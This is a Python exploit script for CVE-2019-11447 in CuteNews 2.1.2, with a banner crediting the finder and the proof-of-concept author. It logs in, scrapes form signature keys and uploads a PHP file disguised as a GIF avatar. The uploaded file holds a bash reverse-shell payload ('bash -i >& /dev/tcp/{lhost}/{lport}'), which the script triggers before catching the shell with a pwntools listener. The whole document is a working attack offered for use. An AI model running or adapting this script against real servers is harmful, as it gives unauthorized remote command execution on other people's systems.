#!/usr/bin/env python3

import argparse
import threading
from time import sleep

import requests
from bs4 import BeautifulSoup as bs
from pwn import listen

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='Target IP address or domain', required=True)
parser.add_argument('-u', '--uname', help='Username', required=True)
parser.add_argument('-p', '--passw', help='Password', required=True)
parser.add_argument('-lh', '--lhost', help='Listener IP address', required=True)
parser.add_argument('-lp', '--lport', help='Listener Port', default=4444)
parser.add_argument('-f', '--file', help='Filename for payload WITHOUT extension', default='payload')
args = parser.parse_args()

url = f'http://{args.target}/index.php'
uname = args.uname
passw = args.passw
lhost = args.lhost
lport = args.lport
fname = args.file
dashboard = url + '?mod=main&opt=personal'

def banner():
    print('''
--------------------------------------
--- CVE-2019-11447 -------------------
--- CuteNews Arbitrary File Upload ---
--- CutePHP CuteNews 2.1.2 -----------
--------------------------------------

[>] Found By : Akkus       [ https://twitter.com/ehakkus     ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]
''')

def trigger(s, avt_url):
    sleep(5)
    s.get(avt_url)

def main():
    print(f'[>] Target   : {url}')
    print(f'[>] Username : {uname}')
    print(f'[>] Password : {passw}' + '\n')

    login_data = {
        'action': 'dologin',
        'username': uname,
        'password': passw
    }

    s = requests.Session()

    print('[!] Logging in...')
    try:
        login = s.post(url, data=login_data, timeout=10)
    except Exception as e:
        print(f'[-] Exception : {str(e)}')
        exit()
    login_sc = login.status_code

    if login_sc == 200:
        try:
            verify = s.get(url, timeout=10)
        except Exception as e:
            print(f'[-] Exception : {str(e)}')
            exit()
        page = verify.text
        soup = bs(page, 'html.parser')
        if 'dashboard' in str(soup.title):
            print('[+] Logged In!')
        else:
            print('[-] Login Failed!')
            exit()
        print('[+] Loading Profile...')
        try:
            load_profile = s.get(dashboard, timeout=10)
        except Exception as e:
            print(f'[-] Exception : {str(e)}')
            exit()
        profile_sc = load_profile.status_code
        if profile_sc == 200:
            print('[+] Searching Signatures...')
            profile_data = load_profile.text
            soup = bs(profile_data, 'html.parser')
            sig_key = soup.find('input', {'name': '__signature_key'})['value']
            sig_dsi = soup.find('input', {'name': '__signature_dsi'})['value']
        else:
            print(f'[-] Error : {str(profile_sc)} | Failed to find signatures!')
            exit()

        payload = f'''GIF89a;\n<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");?>'''.encode()

        multipart_form_data = {
            'mod': (None, 'main'),
            'opt': (None, 'personal'),
            '__signature_key': (None, sig_key),
            '__signature_dsi': (None, sig_dsi),
            'editpassword': (None, None),
            'confirmpassword': (None, None),
            'editnickname': (None, 'twh'),
            'avatar_file': (f'{fname}'  + '.php', payload),
            'more[site]': (None, None),
            'more[about]': (None, None)
        }

        print('[!] Uploading Payload...')
        set_avatar = s.post(url, files=multipart_form_data, timeout=10)
        set_sc = set_avatar.status_code
        if set_sc == 200:
            print('[+] Loading Profile...')
            try:
                load_profile = s.get(dashboard, timeout=10)
            except Exception as e:
                print(f'[-] Exception : {str(e)}')
                exit()
            profile_sc = load_profile.status_code
            if profile_sc == 200:
                print('[+] Searching Avatar URL...')
                profile_data = load_profile.text
                soup = bs(profile_data, 'html.parser')
                avt_url = soup.find('img')['src']
                print(f'[*] URL : {avt_url}')
                print('[!] Payload will trigger in 5 seconds...')
                trigger_thread = threading.Thread(target=trigger, args=[s, avt_url])
                trigger_thread.daemon = True
                trigger_thread.start()
                print('[!] Starting Listner...')
                shell = listen(lport)
                shell.wait_for_connection()
                shell.interactive()
            else:
                print(f'[-] Error : {str(profile_sc)} | Failed to load profile!')
                exit()
        else:
            print(f'[-] Error : {str(set_sc)} | Failed to upload payload!')
            exit()
    else:
        print(f'[-] Error : {str(login_sc)} | Login Failed!')
        exit()

try:
    banner()
    main()
except KeyboardInterrupt:
    print('[-] Keyboard Interrupt!')
    exit()